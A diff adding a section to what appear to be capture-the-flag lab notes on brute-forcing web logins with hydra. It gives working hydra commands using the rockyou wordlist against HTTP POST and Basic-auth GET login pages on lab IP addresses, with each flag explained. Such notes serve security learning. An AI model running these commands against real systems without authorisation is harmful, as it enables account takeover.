@@ -61,3 +61,25 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.2.70 http-post-form "/a
 ```python
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.162.94 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
+
+## Brute-forcing Default Passwords(get)
+An example used is a page that prompts `Basic HTTP Authentication` form to input the username and password.
+![[hydra.webp]]
+
+**The hydra command to brute-force the above:**
+```python
+hydra -l bob -P /usr/share/wordlists/rockyou.txt -f MachineIP http-get /protected/
+```
+
+**Example** - 
+```python
+hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.76.6 http-get /protected/
+```
+Let’s break the commands down.
+
+- -l = login with name
+- -P = wordlist or path to wordlist
+- -f = Exit when login/pass pair is found
+- MachineIP = the target
+- http-get = Service
+- /protected/ = the webpage with login
